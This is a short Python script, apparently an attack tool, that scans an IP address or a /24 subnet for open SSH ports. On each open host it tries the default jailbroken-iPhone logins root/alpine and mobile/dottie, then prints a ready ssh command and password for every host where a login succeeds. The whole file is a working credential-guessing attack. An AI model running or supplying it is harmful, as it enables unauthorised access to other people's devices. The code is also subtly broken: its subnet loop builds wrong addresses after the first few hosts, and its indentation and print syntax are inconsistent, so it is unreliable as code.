from pexpect import pxssh
import socket


def isOpen(ip,port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   try:
      s.connect((ip, int(port)))
      s.shutdown(1)
      return True
   except:
      return False

def login(ip, uname, pwd):
 try:
  p = pxssh.pxssh(timeout=1)
  if p.login (ip, uname, pwd) == True:
   print ('[*] ' + ip+ '  --->  This host seems VULNERABLE!')
   p.logout()
   p = pxssh.pxssh(timeout=1)
   if uname == 'root':
    print ('[*]   You can connect this host with the command --> ssh root@' + ip + ' :) Password is alpine')
   if uname == 'mobile':
    print ('[*]   You can connect this host with the command --> ssh mobile@' + ip + ' :) Password is dottie')
 except pxssh.ExceptionPxssh as e:
   print "[*] "+ip+"  --->  This host seems not vulnerable."
   p = pxssh.pxssh(timeout=1)

print ('Welcome! If you want to scan 0/24 subnet, choise option 2 and enter the IP. (e.g 192.168.1.*)')
n = raw_input("1) Scan an IP adress / 2) Scan a 0/24 subnet : ");
if n=="2" or n=="1":
 ip = raw_input("Enter the IP adress : ")
 if ip[-1]=="*":
  for i in range(0,256):
	ip = ip[:-1] + str(i)
        if isOpen(ip,22) == True:
            user = 'root'
            passw = 'alpine' 
	    user2 = 'mobile'
	    passw2 = 'dottie'	
            login(ip, user, passw)
	    login(ip, user2, passw2)	
        else:
	 print ('[*] ' + ip+ '  --->  This host is down or port 22 is closed.')
 else:
	if isOpen(ip,22) == True:
            user = 'root'
            passw = 'alpine' 
	    user2 = 'mobile'
	    passw2 = 'dottie'	
            login(ip, user, passw)
	    login(ip, user2, passw2)	
        else:
	 print ('[*] ' + ip+ '  --->  This host is down or port 22 is closed.')
else:
 print ("Unknown option.")